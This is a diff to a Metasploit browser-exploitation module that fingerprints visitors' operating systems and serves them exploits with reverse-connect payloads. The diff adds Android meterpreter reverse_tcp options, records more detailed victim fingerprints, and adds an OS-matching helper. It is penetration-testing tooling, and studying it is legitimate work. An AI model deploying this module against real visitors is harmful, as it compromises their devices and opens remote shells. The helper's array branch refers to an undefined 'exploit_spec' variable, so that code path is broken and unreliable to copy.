@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -114,6 +114,13 @@ class Metasploit3 < Msf::Auxiliary
         'The payload to use for Java reverse-connect payloads',
         'java/meterpreter/reverse_tcp'
       ]),
+      OptPort.new('LPORT_ANDROID', [false,
+        'The port to use for Java reverse-connect payloads', 8888
+      ]),
+      OptString.new('PAYLOAD_ANDROID', [false,
+        'The payload to use for Android reverse-connect payloads',
+        'android/meterpreter/reverse_tcp'
+      ])
     ], self.class)
 
     @exploits = Hash.new
@@ -218,7 +225,7 @@ class Metasploit3 < Msf::Auxiliary
       }
 
       function bodyOnLoad() {
-        var detected_version = window.os_detect.getVersion();
+        var detected_version = os_detect.getVersion();
         //#{js_debug('detected_version')}
         report_and_get_exploits(detected_version);
       } // function bodyOnLoad
@@ -265,6 +272,8 @@ class Metasploit3 < Msf::Auxiliary
     @gen_payload  = datastore['PAYLOAD_GENERIC']
     @java_lport = datastore['LPORT_JAVA']
     @java_payload = datastore['PAYLOAD_JAVA']
+    @android_lport = datastore['LPORT_ANDROID']
+    @android_payload = datastore['PAYLOAD_ANDROID']
 
     minrank = framework.datastore['MinimumRank'] || 'manual'
     if not RankingName.values.include?(minrank)
@@ -320,6 +329,9 @@ class Metasploit3 < Msf::Auxiliary
     when %r{/java_}
       payload = @java_payload
       lport = @java_lport
+    when %r{^android/}
+      payload = @android_payload
+      lport = @android_lport
     else
       payload = @gen_payload
       lport = @gen_lport
@@ -774,8 +786,12 @@ class Metasploit3 < Msf::Auxiliary
               # Reject exploits whose OS doesn't match that of the
               # victim. Note that host_info comes from javascript OS
               # detection, NOT the database.
+
+              # Note that the os_name could be a string, a regex, or
+              # an array of strings and regexes.
+
               if host_info[:os_name] != "undefined"
-                unless s[:os_name].include?(host_info[:os_name])
+                unless client_matches_module_spec?(host_info[:os_name], s[:os_name])
                   vprint_status("Rejecting #{s[:name]} for non-matching OS")
                   next
                 end
@@ -819,6 +835,27 @@ class Metasploit3 < Msf::Auxiliary
       vprint_status("* #{name}")
     end
     return response
+  end
+
+
+  #
+  # Determines whether a browser string matches an exploit module specification
+  # Example: :os_name => ( 'Windows' | /Windows/ | ['Windows', 'Mac OS X'] )
+  #
+  def client_matches_module_spec?(client_str, module_spec)
+
+    case module_spec
+    when ::String
+      return !! (client_str == module_spec)
+    when ::Regexp
+      return !! client_str.match(module_spec)
+    when ::Array
+      return !! exploit_spec.map{ |spec|
+        client_matches_module_spec?(client_str, spec)
+      }.include?(true)
+    end
+
+    false
   end
 
   #
@@ -874,6 +911,8 @@ class Metasploit3 < Msf::Auxiliary
     os_flavor = nil
     os_sp = nil
     os_lang = nil
+    os_device = nil
+    os_vendor = nil
     arch = nil
     ua_name = nil
     ua_ver = nil
@@ -895,15 +934,19 @@ class Metasploit3 < Msf::Auxiliary
       if (0 < detected_version.length)
         detected_version = Rex::Text.decode_base64(Rex::Text.uri_decode(detected_version))
         print_status("JavaScript Report: #{detected_version}")
-        (os_name, os_flavor, os_sp, os_lang, arch, ua_name, ua_ver) = detected_version.split(':')
+
+        (os_name, os_vendor, os_flavor, os_device, os_sp, os_lang, arch, ua_name, ua_ver) = detected_version.split(':')
 
         if framework.db.active
           note_data = { }
-          note_data[:os_name]   = os_name   if os_name != "undefined"
-          note_data[:os_flavor] = os_flavor if os_flavor != "undefined"
-          note_data[:os_sp]     = os_sp     if os_sp != "undefined"
-          note_data[:os_lang]   = os_lang   if os_lang != "undefined"
-          note_data[:arch]      = arch      if arch != "undefined"
+          note_data['os.product']   = os_name   if os_name != 'undefined'
+          note_data['os.vendor']    = os_vendor if os_vendor != 'undefined'
+          note_data['os.edition']   = os_flavor if os_flavor != 'undefined'
+          note_data['os.device']    = os_device if os_device != 'undefined'
+          note_data['os.version']   = os_sp     if os_sp != 'undefined'
+          note_data['os.language']  = os_lang   if os_lang != 'undefined'
+          note_data['os.arch']      = arch      if arch != 'undefined'
+          note_data['os.certainty'] = '0.7'
           print_status("Reporting: #{note_data.inspect}")
 
           # Reporting stuff isn't really essential since we store all
@@ -914,10 +957,14 @@ class Metasploit3 < Msf::Auxiliary
           # ActiveRecord::RecordInvalid errors because 127.0.0.1 is
           # blacklisted in the Host validations.
           begin
+
+            # Report a generic fingerprint.match note for the OS normalizer
+            # Previously we reported a javascript_fingerprint type but this
+            # was never used.
             report_note({
-              :host => cli.peerhost,
-              :type => 'javascript_fingerprint',
-              :data => note_data,
+              :host   => cli.peerhost,
+              :ntype  => 'fingerprint.match',
+              :data   => note_data,
               :update => :unique_data,
             })
             client_info = {
@@ -927,8 +974,10 @@ class Metasploit3 < Msf::Auxiliary
               :ua_ver    => ua_ver
             }
             report_client(client_info)
-          rescue => e
-            elog("Reporting failed: #{e.class} : #{e.message}")
+          rescue ::Interrupt
+            raise $!
+          rescue ::Exception => e
+            elog("Reporting failed: #{e.class} : #{e.message} #{e.backtrace}")
           end
         end
       end
@@ -959,7 +1008,9 @@ class Metasploit3 < Msf::Auxiliary
 
     @targetcache[key][:host] = {}
     @targetcache[key][:host][:os_name] = os_name
+    @targetcache[key][:host][:os_vendor] = os_vendor
     @targetcache[key][:host][:os_flavor] = os_flavor
+    @targetcache[key][:host][:os_device] = os_device
     @targetcache[key][:host][:os_sp] = os_sp
     @targetcache[key][:host][:os_lang] = os_lang
 
